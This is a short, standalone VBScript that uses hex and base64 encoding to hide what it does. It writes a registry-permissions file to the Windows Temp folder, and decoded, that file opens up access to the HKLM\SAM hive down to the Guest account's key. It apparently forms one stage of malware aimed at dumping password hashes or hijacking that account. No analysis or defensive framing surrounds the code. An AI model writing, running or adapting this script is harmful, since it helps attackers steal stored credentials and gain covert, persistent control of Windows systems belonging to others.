Function Base64Decode(ByVal vCode)
 Set oNode = CreateObject("Msxml2.DOMDocument").CreateElement("base64")
 oNode.dataType = "bin.base64"
 oNode.text = vCode
 Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
 Set oNode = Nothing
End Function

Function Stream_BinaryToString(Binary)
 Set BinaryStream = CreateObject("ADODB.Stream")
 BinaryStream.Type = 1
 BinaryStream.Open
 BinaryStream.Write Binary
 BinaryStream.Position = 0
 BinaryStream.Type = 2
 ' All Format =>  utf-16le - utf-8 - utf-16le
 BinaryStream.CharSet = "utf-8"
 Stream_BinaryToString = BinaryStream.ReadText
 Set BinaryStream = Nothing
End Function

Dim xmldoc, node, bytes
Set xmldoc = CreateObject("Msxml2.DOMDocument")
Set node = xmldoc.CreateElement("binary")
node.DataType = "bin.hex"
node.Text = "484b45595f4c4f43414c5f4d414348494e455c53414d205b312c312c315d0d0a484b45595f4c4f43414c5f4d414348494e455c53414d5c53414d205b312c312c315d0d0a484b45595f4c4f43414c5f4d414348494e455c53414d5c53414d5c446f6d61696e73205b312c312c315d0d0a484b45595f4c4f43414c5f4d414348494e455c53414d5c53414d5c446f6d61696e735c4163636f756e74205b312c312c315d0d0a484b45595f4c4f43414c5f4d414348494e455c53414d5c53414d5c446f6d61696e735c4163636f756e745c5573657273205b312c312c315d0d0a484b45595f4c4f43414c5f4d414348494e455c53414d5c53414d5c446f6d61696e735c4163636f756e745c55736572735c3030303030316635205b312c312c315d"
bytes = node.NodeTypedValue
FilePath = Base64Decode("QzpcV2luZG93c1xUZW1wXDliNjUxZjhkLWVkNGEtMTFlZC1iODNhLTY4NTQ1YWFjOTg1YS5pbmk=")
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1 'Binary
objStream.Open
objStream.Write bytes
objStream.SaveToFile FilePath, 2 'Overwrite
objStream.Close